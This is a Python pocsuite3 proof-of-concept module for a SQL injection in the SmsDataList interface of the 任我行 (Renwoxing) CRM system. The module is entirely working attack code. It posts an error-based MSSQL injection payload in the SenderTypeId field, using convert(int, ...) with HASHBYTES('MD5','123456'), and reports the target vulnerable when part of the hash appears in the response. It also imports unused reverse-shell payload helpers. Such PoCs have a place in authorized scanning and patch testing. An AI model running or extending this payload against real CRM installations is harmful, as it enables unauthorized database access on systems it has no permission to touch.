# _*_ coding:utf-8 _*_
# @Time : 2024/1/3

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str


class rwx_crm_smsdatalist_sql(POCBase):
    pocDesc = '''任我行CRM系统SmsDataList接口SQL注入漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2024-01-03'
    name = '任我行CRM系统SmsDataList接口SQL注入漏洞'

    def _verify(self):

        result = {}
        path = """/SMS/SmsDataList/?pageIndex=1&pageSize=30"""
        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            "Content-Type": 'application/x-www-form-urlencoded',
            'Connection': 'Keep-Alive'
        }
        url = self.url + path
        data = "Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000'and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI"

        try:
            response = requests.post(url, headers=headers, data=data, verify=False)
            if response.status_code == 200 and 'dc3949ba59ab' in response.text:
                result['VerifyInfo'] = {}

            return self.parse_output(result)
        except Exception as e:
            pass


register_poc(rwx_crm_smsdatalist_sql)